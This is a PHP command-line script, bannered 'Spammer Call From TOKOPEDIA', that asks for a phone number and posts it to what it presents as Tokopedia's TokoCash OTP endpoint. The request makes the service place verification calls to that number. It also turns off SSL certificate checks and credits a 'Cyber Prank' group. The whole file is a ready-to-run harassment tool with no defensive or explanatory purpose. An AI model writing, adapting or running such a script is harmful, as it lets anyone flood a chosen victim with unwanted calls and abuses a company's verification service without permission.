<?php
// Limit 3x Telpon Setiap Sat Nomor
function send($phone){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");                        $asw = curl_exec($ch);
        curl_close($ch);
                echo $asw."\n";
}
echo "
############################################################
    Spammer Call From TOKOPEDIA
    Mod By      : Brebes Cyber Prank
    Facebook Me : Galank Rambu Anarki
    Addres      : Limbangan City
    Watsapp     : 62888888888888888888
    Instagram   : Ora Ndue
    Thanks to   : Mr.Ndog Asin
    Penggunaan  : Awali Dengan Angka [62]
############################################################\n";
echo "Nomor\nInput : ";
$nomor = trim(fgets(STDIN));
$execute = send($nomor);
print $execute;
?>
